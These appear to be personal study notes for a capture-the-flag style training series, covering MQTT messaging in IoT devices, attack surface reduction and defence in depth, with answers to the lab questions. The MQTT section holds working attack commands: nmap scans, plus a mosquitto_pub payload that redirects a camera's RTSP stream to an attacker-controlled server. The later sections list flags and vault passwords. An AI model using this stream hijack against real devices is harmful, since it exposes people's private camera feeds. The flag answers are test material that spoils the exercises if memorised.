- Below is a brief synopsis of popular messaging protocols used by IoT devices.

![](Pasted image 20221223151954.png)

- We will continue diving deeper into the MQTT protocol and potentially related security issues throughout this task.

### Functionality of a Publish/Subscribe Model

- Messaging protocols commonly use a **publish/subscribe model**, notably the **MQTT protocol**. 
- The model relies on a broker to negotiate **"published" messages** and **"subscription" queries**. 
- Let's first look at a diagram of this process and then break it down further.

![](Pasted image 20221223152139.png)

- Based on the above diagram,

1.  A publisher sends their message to a broker.
2.  The broker continues relaying the message until a new message is published.
3.  A subscriber can attempt to connect to a broker and receive a message.

- The protocol should work fantastically if a single broker is needed for one device's objective, but what if several types of data need to be sent from one device or several publishers and subscribers need to connect to one broker? 
- Using more than one broker can be feasible but increases unnecessary overhead and server usage.

- A secure communication method should also ensure the integrity of messages, meaning one publisher should not overwrite another.

- To address these problems, a broker can store multiple messages from different publishers by using **topics**. 
	- A topic is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. 
		- The format of a topic commonly takes the form of `<name>/<id>/<function>`. 
- When a new message is sent with a given topic, the broker will store or overwrite it under the topic and relay it to subscribers who have "subscribed" to it.

- Below is a diagram showing two publishers sending different messages associated with topics.

![](Pasted image 20221223152340.png)

- Below is a diagram of several subscribers receiving messages from separate topics of a broker.

![](Pasted image 20221223152412.png)

- Note the _asynchronous_ nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. 
- Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.

- Well, we should now understand the functionality of this model, but why would an IoT device use it?

- A publish/subscribe model is helpful for any data maintained asynchronously or received by several different devices from one publisher.

- A common example of a publish/subscribe model could be a thermostat publishing its current temperature. 
	- Several thermostats can publish to one broker, and several devices can subscribe to the thermostat they want data from.

- As a protocol specifically, MQTT is also lightweight, with a small footprint and minimal bandwidth.

### Are IoT Protocols Inherently Vulnerable?

- We've identified the relation between IoT protocols and network services and how messaging protocols function. 
	- This still leaves the question of how secure IoT protocols are.

- Let's apply this to something we are more familiar with, HTTP. 
	- "HTTP vulnerabilities" often refer to a vulnerability in the software/application built off the protocol; this does not mean protocols are absent of vulnerabilities, but they generally possess strict requirements and require revisions before release or public adoption.

- Similarly, IoT protocols are not inherently vulnerable, so what makes an IoT device insecure?

- Before giving a more formal explanation, let's consider the default settings of MQTT when it is first deployed. 
- An MQTT broker assigns all devices connected to it read/write access to all topics; that is, any device can publish and subscribe to a topic. 
	- We may be okay with this idea at first; in the thermostat example, we are only communicating temperatures, so the integrity of the data should not be an issue.
	- But let's dive into this issue more.

- Our data should follow CIA (Confidentiality, Integrity, and Availability) best practices as closely as possible; that is, data should not be read or manipulated by unauthorized sources and should be accessible to authorized users. 
	- Following best practices, authentication and authorization should be implemented to prevent potentially bad actors from compromising any principle of the CIA triad.

- What is the risk to IoT devices if best practices are not considered? 
	- Risk is almost solely dependent on the behavior of a device. 
- Let's say a device trusts an MQTT publisher and parses data or commands to perform actions affecting the device's settings. 
- An attacker could send a malicious message to perform unintended actions. 
	- For example, a thermostat sends a message with a specific format to a broker, and a subscriber parses the message and changes the temperature. 
- An attacker could send their message outside of the intended application (e.g., a mobile app) to modify the device's temperature. 
	- Although this example may seem modest, imagine the impact this could have on other devices with consequences or critical devices, which are essential to the function of a society and/or economy.

- To recap, an MQTT instance may be insecure due to improper data regulation best practices. 
	- An instance may be vulnerable if the device's behavior allows an attacker to perform malicious actions from expected interaction.

- Note the differentiation between insecure and vulnerable; an insecure implementation may allow an attacker to exploit a vulnerability, but this does not mean the implementation is inherently vulnerable.

- In the next task, we will expand this idea and attempt to identify methods we can use to identify the behavior of a given device.

### Abusing Device Behavior

- Before moving on to the hands-on section, let's address how we can identify information about device behavior.

- We've defined that IoT devices are vulnerable because of their applications' behavior. 
	- Now let's briefly look at how we can analyze a device's behavior for vulnerable entry points and how they can be abused.

- An attacker can discover device behavior from communication sniffing, source code analysis, or documentation.

	-   **Communication sniffing** can determine the protocol used, the middleware or broker address, and the communication behavior. 
		- For example, unencrypted HTTP requests are sent to a central server, which are then translated to CoAP packets. 
		- We can observe the HTTP packets and look for topics or message formats that vendors should hide, e.g. settings, commands, etc., to interact with the device.
	-   **Source code analysis** can give you direct insight into how a device parses sent data and how it is being used. 
		- Analysis can identify similar information to communication sniffing but may act as a more reliable and definite source of information.
	-   **Documentation** provides you with a clear understanding of the standard functionality of a device or endpoint. 
		- A disadvantage of only using documentation as a means of identification is that it may leave out sensitive payloads, topics, or other information that is not ordinarily relevant to an end user that we, as attackers want.

- Once a behavior is identified, we can use clients to interact with devices and send malicious messages/payloads.

- To cement this concept, let's go back to the thermostat example and see how an attacker may attempt to control the device.   

- Most IoT devices have a device ID that they use to identify themselves to other devices and that other devices can use to identify the target device. 
- Devices must exchange this device ID before any other communication can occur. 
	- In the case of MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.  

- Once an attacker knows the device ID and behavior of a target device they can attempt to target specific topics or message formats. 
	- These topics may trust the message source and perform some action blindly (e.g. change a temperature, change a publishing destination, etc.)

- In our scenario, preliminary information has been identified by Recon McRed through hardware analysis and firmware reverse engineering. 
- The web camera device is known to use the MQTT protocol, and we have a list of potential topics we can target. 
	- Before analyzing these potentially vulnerable topics, let's look at how we may interact with an MQTT endpoint normally.

### Interacting with MQTT
#paho #mosquitto

- How do we interact with MQTT or other IoT protocols? 
- Different protocols will have different libraries or other means of interacting with them. 
- For MQTT, there are two commonly used libraries we will discuss, that is, **Paho** and **Mosquitto**. 
	- Paho is a python library that offers support for all features of MQTT. 
	- Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.

- In this task, we will introduce the Mosquitto clients and their functionality; in the next task, we will leverage the clients against a vulnerable device to get hands-on.

#### **Subscribing to a Topic**

- We can use the [mosquitto_sub](https://mosquitto.org/man/mosquitto_sub-1.html) client utility to subscribe to an MQTT broker.

- By default, the subscription utility will connect a localhost broker and only require a topic to be defined using the `-t` or **`—topic`** flag. 
- Below is an example of connecting to a localhost and subscribing to the topic, _device/ping_.

`mosquitto_sub -t device/ping`

- You can also specify a remote broker using the `-h` flag. 
- Below is an example of connecting to _example.thm_ and subscribing to the topic, _device/thm_.

`mosquitto_sub -h example.thm -t device/thm`

#### **Publishing to a Topic**

- We can use the [mosquitto_pub](https://mosquitto.org/man/mosquitto_pub-1.html) client utility to publish to an MQTT broker.

- To publish a message to a topic is nearly identical to that of the subscription client. 
- This time, however, we need to include a `-m` or `—message` flag to denote our message/payload. 
- Below is an example of publishing to the topic, _device/info_ on the host, _example.thm_ with the message, _"This is an example."_

`mosquitto_pub -h example.thm -t device/info -m "This is an example"`

- For both clients, there are several notable optional flags that we will briefly mention,

	-   `-d`: Enables debug messages.
	-   `-i` or `—id`: Specifies the id to identify the client to the server.
	-   `-p` or `—port`: Specifies the port the broker is using. Defaults to port `1883`.
	-   `-u` or `—username`: Used to specify the username for authentication.
	-   `-P` or `—password`: Used to specify the password for authentication.
	-   `—url`: Used to specify username, password, host, port, and topic in one URL.

- A device using MQTT will craft messages as a means of communication authentically. 
- As an attacker, we will attempt to portray our publishing source as a legitimate source in hopes that the other side will interact with the message as it would an authentic message to provide us with unintended behavior.

### Practical Application

- We have covered all of the information needed to successfully approach exploiting an insecure data communication implementation of an IoT device. 
	- Let’s try to take what we have learned and apply it to the unknown web camera identified in Santa’s Workshop.

- As briefly covered previously, we know the following:  

	-   The device interacts with an MQTT broker to publish and subscribe to pre-defined topics.
	-   The device broker is found at `10.10.230.161`.
	-   From firmware reverse engineering, we know that the device uses these two topics
	    -   `device/init`
	        -   Publishes the device ID of the current device
	    -   `device/<id>/cmd`
	        -   Subscribes to the device ID-specific topic to receive commands and settings.
	-   The device is known to use **RTSP** (Real Time Streaming Protocol) for input streaming.
	-   If an attacker can control where and how the RTSP stream is forwarded, they can redirect it to an RTSP server they control.
	    -   The `device/<id>/cmd` topic can specify a behavior through a numeric CMD parameter and the ability to parse a key-value pair to be used to interact with the device.

- We do not yet possess how the command topic behaves or the format it is expecting the message. 
- It is up to you to craft a malicious message to target the command topic. 
- If you are looking for a challenge, we have provided you with a small source code snippet extracted from the device firmware that you can use to gather communication behavior from. 
- Otherwise, we have collected the information you need with the expected format and behavior of the device.

- To get you started, we have provided steps for exploitation set up below,

1.  Verify that `10.10.230.161` is an MQTT endpoint and uses the expected port with _Nmap_.
2.  Use `mosquitto_sub` to subscribe to the `device/init` topic to enumerate the device and obtain the device ID.
3.  Start an RTSP server using [rtsp-simple-server](https://github.com/aler9/rtsp-simple-server)
    -   `docker run --rm -it --network=host aler9/rtsp-simple-server`
    -   Note the port number for _RTSP_; we will use this in the URL you send in your payload.
    -   If you are having issues receiving a connection and are confident that your formatting is correct, you can attempt to use a TCP listener - `sudo docker run --rm -it -e RTSP_PROTOCOLS=tcp -p 8554:8554 -p 1935:1935 -p 8888:8888 aler9/rtsp-simple-server`
4.  Use `mosquitto_pub` to publish your payload to the `device/<id>/cmd` topic.
    -   Recall that your URL must use the attackbox IP address or respective interface address if you are using the VPN and be in the format of `rtsp://xxx.xxx.xxx.xxx:8554/path`
    -   If the message was correctly interpreted and the RTSP stream was redirected the server should show a successful connection and may output warnings from dropped packets.
    
5.  You can view what is being sent to the server by running VLC and opening the server path of the locally hosted RTSP server.
    -   `vlc rtsp://127.0.0.1:8554/path`
    -   If you are using Kali, you must download VLC from the _snap_ package manager to ensure the proper codecs are installed.

### Questions

  
What port is Mosquitto running on? 

- Ran `nmap -p- <IP> -vv --min-rate 1500`
- Apart from port 22 and 80, there is another one:

![](Pasted image 20221223155758.png)

![](Pasted image 20221223155851.png)

 A: 1883
 
Is the _device/init_ topic enumerated by Nmap during a script scan of all ports? (y/n)

`nmap -sC -sV -p- 10.10.230.161 -vv --min-rate 1500`

![](Pasted image 20221223160516.png)

A: y

What Mosquitto version is the device using?  

![](Pasted image 20221223160704.png)

 A: 1.6.9
 
What flag is obtained from viewing the RTSP stream?

- Subscribed to `device/ping`: ` mosquitto_sub -h 10.10.230.161 -t device/init
- Got the device ID:
- ![](Pasted image 20221223161420.png)
- Initiated an RTSP server: `-   `docker run --rm -it --network=host aler9/rtsp-simple-server``
- Published the payload: `mosquitto_pub -h 10.10.230.161 -t device/3OZROCITAW46B9BI0ZHV/cmd -m """{"cmd":"10","url":"rtsp://10.10.231.110:8554/anything"}"""
`
- A connection should be initiated on the other terminal where the server is running

- View the stream:  -   `vlc rtsp://127.0.0.1:8554/anything`

![](Pasted image 20221223163902.png)

A: THM{UR_CAMERA_IS_MINE}

## [Day 22] `Attack Surface Reduction` Threats are failing all around me

#attackvectors

### Attack Vectors

- An attack vector is a tool, technique, or method used to attack a computer system or network. 
- If we map the attack vectors to the physical world, attack vectors would be the weapons an adversary uses, like, swords, arrows, hammers, etc. 
- A non-exhaustive list of examples of attack vectors in cybersecurity includes the following: 
	-   Phishing emails; Deceptive emails that are often impersonating someone and asking the victim to perform an action that compromises their security.
	-   Denial of Service (DoS) or Distributed Denial of Service (DDoS) attacks; Sending so many requests to a website or web application that it reaches its limits and can no longer serve legitimate requests.
	-   Web drive-by attacks; Flaws in web browsers that compromise the security of the victim by merely visiting a website.
	-   Unpatched Vulnerability exploitation; A flaw in the internet-facing infrastructure, such as the web server or the network interface, that is exploited to take control of the infrastructure.

### Attack Surface

- The attack surface is the surface area of the victim of an attack that can be impacted by an attack vector and cause damage. 
- Taking forward our example of the physical world, the attack surface will include the unarmoured body of a soldier, which an attack of a sword, an arrow, or a hammer, etc., can damage. 
- In cybersecurity, the attack surface will generally contain the following: 
	-   An email server that is used for sending and receiving emails.
	-   An internet-facing web server that serves a website to visitors.
	-   End-user machines that people use to connect to the network.
	-   Humans can be manipulated and tricked into giving control of the network to an attacker through social engineering.

### Attack Surface Reduction

- As we might notice, the attack surface can not be eliminated short of running away from the battlefield. 
	- It can only be reduced. 
- The Greek Phalanx is an excellent example of attack surface reduction, as seen in the picture. 
- In the picture, the front of the defending army is covered by their shields, whereas the walls of a pass cover the sides, leaving no room for an attacker to inflict damage on the defenders without running into their defenses. 
- This is how the Spartan army could hold back a much larger Persian army for several days in the battle of Thermopylae.

![](Pasted image 20221223171015.png)

- However, this attack surface reduction works for the weapons of that time. 
- This technique will not impact the attack surface against modern weapons. 

- In cybersecurity, the most secure computer is the one that is shut down and its cables removed. 
- However, that is not feasible for running critical operations dependent on computers. 
- Therefore, cybersecurity leaders aim to keep the operations running with the lowest possible attack surface. 
- We can consider the goal as creating the digital equivalent of the Greek Phalanx.

### Examples of Attack Surface Reduction

- Now that we have understood the concept behind attack surface reduction let's identify the attack vectors that could be used against Santa's infrastructure. 
- Let's help McSkidy devise a Greek Phalanx defense to minimize the attack surface. 

- Close the ranks:  
	- Santa's website was defaced earlier. 
	- When investigating that attack, McSkidy found that an SSH port was open on the server hosting the website. 
	- This led to the attacker using that open port to gain entry. 
	- McSkidy closed this port.  

- Put up the shields:  
	- Although the open SSH port was protected by a password, the password was not strong enough to resist a brute-forcing attempt. 
	- McSkidy implemented a stronger password policy to make brute-forcing difficult. 
	- Moreover, a timeout would lock a user out after five incorrect password attempts, making brute-force attacks more expensive and less feasible.

- Control the flow of information:  
	- McSkidy was informed by her team about the GitHub repository that contained sensitive information, including some credentials. 
	- This information could be an attack vector to target Santa's infrastructure. 
	- This information was made private to block this attack vector. 
	- Moreover, best practices were established to ensure credentials and other sensitive information are not committed to GitHub repositories.

- Beware of deception:  
	- Another attack vector used to intrude into Santa's network was phishing emails. 
	- McSkidy identified that no phishing protection was enabled, which led to all such emails landing in the inbox of Santa's employees. 
	- McSkidy enabled phishing protection on Santa's email server to filter out spoofed and phishing emails. 
	- All emails identified as phishing or spoofed were dropped and didn't reach the inbox of Santa's employees.

- Prepare for countering human error:  
	- The phishing email that targeted Santa's employees contained a document containing malicious macros. 
	- To mitigate the risk of malicious macro-based documents compromising Santa's infrastructure, McSkidy disabled macros on end-user machines used by Santa's employees to avoid malicious macro-based attacks.

- Strengthen every soldier:  
	- McSkidy wanted the attack surface reduced from every endpoint's point of view. 
	- So far, she had taken steps to strengthen the network as a whole. For strengthening each endpoint, she took help from [Microsoft's Attack Surface Reduction rules](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide). 
	- Though these rules were built into the Microsoft Defender for Endpoint product, she took help from these rules and created a similar set of rules for her own EDR platform. 

- Make the defense invulnerable:  
	- To further strengthen the infrastructure, McSkidy carried out a vulnerability scan highlighting some vulnerabilities in the internet-facing infrastructure. 
	- McSkidy patched these vulnerabilities found on Santa's internet-facing infrastructure to avoid exploitation.

### Questions

Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task.

![](Pasted image 20221223171630.png)

![](Pasted image 20221223171730.png)

A: THM{4TT4CK SURF4C3 R3DUC3D}

## [Day 23] `Defence in Depth` Mission ELFPossible: Abominable for a Day

### Core Mindset

- The core mindset that Defense in Depth is founded on is the idea that there is no such thing as a silver bullet that would defeat all of an organisation’s security woes. 
	- No single defence mechanism can protect you from the bad world out there.

### Contrasting the Past and the Modern Takes on Defensive Security

- Castle walls are built to withstand sieges and barrages and are fortified and manned well to protect from pillagers and marauders. 
- Yet despite all this effort and diligence at maintaining and protecting this security measure, attackers will breach it sooner or later, and depending on the defenders' response within the castle walls, may mark the start of their end.

- For the longest time, and maybe even until today, a lot of organisations have looked at their security posture in the same way medieval lords did: a strong focus on securing the castle walls - the perimeter, so to speak. 
	- However, like medieval lords, after the perimeter is breached and depending on the organisation’s response, it’s pretty much done for them too.

- Fret not, though! Modern defensive security teams are moving on from this mindset and are shifting to a more robust approach. 
- Being mindful that the castle wall, while important, is not the only way to secure the organisation, acknowledging the reality that at some point, gunpowder will be discovered and a single point of failure consequently exploited, and having additional defensive layers, especially for the specific _crown jewels_ that the bad guys may be targeting - these are some of the foundations that make up the modern security posture of defensible organisations.

### Disrupting Adversarial Objectives

- Defense in Depth is mainly focused on disrupting adversarial objectives; that is, the shift of focus from ‘just’ securing the perimeter to securing everything in the path that the adversary will have to take from the perimeter to the crown jewels.

- Let’s look at it at three varying levels of defense:

1.  The first level is having a focus on perimeter security. There are great prevention mechanisms present in the perimeter and essentially complete trust within it; thus, once the perimeter is bypassed, the organisation is pretty much at the mercy of the adversary.
2.  The second level has defensive layers in place; however, the emphasis is solely on prevention. It doesn’t leverage ‘knowing your environment’; even though adversarial objectives may be prevented to some degree, there’s a missed opportunity in terms of detection and consequently, alerting and response. Prevention is good, but the key to defeating the bad guys is having visibility into what they are doing.
3.  The third level has well-rounded defensive layers in place, leveraging the strategic application of sensors, effective creation of analytics, and efficient alerting and response capabilities of the security team. Preventative measures here are not only coupled by detection and alerting but also by immediate and efficient response.

- The first level above can be thought of as an organisation that employs great perimeter defenses in place, such as Web Application Firewalls (WAFs), Perimeter Network Firewalls, and even a Demilitarized Zone (DMZ), but is yet to implement internal network security, and zero trust mechanisms are not yet in place.

- The second level can be thought of as an organisation that employs the first level of defenses but with more capable internal security measures, such as network segmentation, zero trust principle implementation, least privileged access principle implementation, and even hardened hosts and networks. 
	- Having this level is actually really good; however, forgetting that preventative appliances may be used for detective capabilities, too, is a wasted opportunity.

- The third level can be thought of as using the advantages of the first and second levels to ramp up the detection and response capability of the organisation via effective log collection and well-crafted analytics. 
	- This is where it goes full circle. 
	- We are not only expected to be good at layering preventive measures against attacks, but we should also be capable of responding to them if and when these defensive capabilities are bypassed.


- Let’s have the following scenario as an example: let’s say an adversary was able to penetrate our perimeter defenses via a successful spear phishing campaign. 
	- He would need to navigate a hardened environment full of tripwires and traps.

- He may be able to take over a specific user’s account, but since we have implemented the principle of least privilege access properly, he would be limited in terms of what he can work with. 
	- He may be able to move laterally to another user with better privileges via pass-the-hash. 
	- Still, since we have good logging mechanisms and detection capabilities, our analytics would know exactly what pass-the-hash looks like, so we will pick this activity up. 
	- Our cavalry will be alerted to respond and remediate this particular breach immediately.

- Remember that the main difference between levels 2 and 3 is the jiving together of these defensive layers and detection and response mechanisms, allowing for a coherent and well-rounded security posture.

- A goal of layering defenses is to limit the room for mistakes that an adversary can have. 
	- In that sense, the bad guys need to get everything correct, but we only need them to make a mistake once.

- To drive this point home, we will explore what it’s like to be in the bad guy’s shoes.

- We have prepared a little game for you. 
- The game's objective is simple: get your hands on the Naughty or Nice list in Santa’s vault. 
- There will be three levels; each consequent one builds a defensive layer on top of the previous one and will be a little bit harder. 
	- Remember that you’re playing as the Bad Yeti here, so make sure you don’t get caught!

### Game summary / post-game discussion

- After completing the game and experiencing the different levels of difficulty that an adversary may face when layering defensive measures, it must be clear to you by now that layering defenses is cool!

- The levels of the game are an analogy to the three varying levels of defenses discussed earlier in this task. 
- Further, the attack chain within the game can be interpreted as follows: Santa’s Executive Assistant (EA) receives a spear phishing email. 
	- Upon establishing a foothold, the Bad Yeti immediately realises that the EA doesn’t have access to the Naughty or Nice list. 
- So after some enumeration and even assuming Santa’s identity at one point, the Bad Yeti was able to get ahold of the coveted list and actually ruin Christmas. 
- Good thing it was just a game!

- While the reason behind it is to show the varying effects of having defensive layers from the bad guy's perspective, on the flip side, the reality of implementing it for defensive security teams is more iterative and cyclic. 
- Breaches and true-positive detections show areas that require improvement and the extent of our visibility in the organisation, respectively. 
- Attacks, whether or not successful, should further inform defensive steps and approaches. 
- If we learned that an adversary was able to exploit a specific vulnerability, then rest assured that the vulnerability will be patched and the application introducing it will be hardened.

### Summary and Conclusion

- Modern security practices are composed of layers. 
- Stopping attacks from the get-go is very helpful - ideal even, but it’s not always possible. 
- Everyone can and will be compromised - it’s just a matter of when, and it’s up to every one of us to disrupt them from being able to do what they intend to do and in every step of the way.


### Questions

![](Pasted image 20221224114556.png)

![](Pasted image 20221224114708.png)
Case 1: What is the password for Santa’s Vault?

 A: S3cr3tV@ultPW

Case 1: What is the Flag?  

![](Pasted image 20221224114757.png)

 A:THM{EZ_fl@6!}

Case 2: What is Santa’s favourite thing?  
![](Pasted image 20221224114926.png)
 A: MilkAndCookies

Case 2: What is the password for Santa’s Vault?  

Opened the laptop with the password being Santa's favourite thing we got previously. This got a txt file with the password of the vault inside it.

 A: 3XtrR@_S3cr3tV@ultPW

Case 2: What is the Flag?  

![](Pasted image 20221224115029.png)

 A: THM{m0@r_5t3pS_n0w!}

Case 3: What is the Executive Assistant’s favourite thing?  

![](Pasted image 20221224115320.png)

 A: BanoffeePie
 

![](Pasted image 20221224115728.png)

![](Pasted image 20221224115252.png)

![](Pasted image 20221224115817.png)


Case 3: What is Santa’s previous password?  

![](Pasted image 20221224115849.png)

 A:  H0tCh0coL@t3_01

Case 3: What is Santa’s current password?  

- Just change the last digit of his old password

![](Pasted image 20221224120332.png)

A: H0tCh0coL@t3_02

Case 3: What is the 1st part of the vault’s password?  

![](Pasted image 20221224120343.png)

A: N3w4nd1m

Case 3: What is the 2nd part of the vault’s password?  

![](Pasted image 20221224115828.png)

 A: Pr0v3dV@ultPW

Case 3: What is the password for Santa’s Vault?  

 A:  N3w4nd1mPr0v3dV@ultPW

Case 3: What is the Flag?  

![](Pasted image 20221224120414.png)

 A:  THM{B@d_Y3t1_1s_n@u6hty}
 
What is Santa's Code?  

 A: 2845
 
Mission ELFPossible: What is the Abominable for a Day Flag?

- Went to the workshop and entered the santa's code

![](Pasted image 20221224120438.png)

A:  THM{D3f3n5e_1n_D3pth_1s_k00L!!}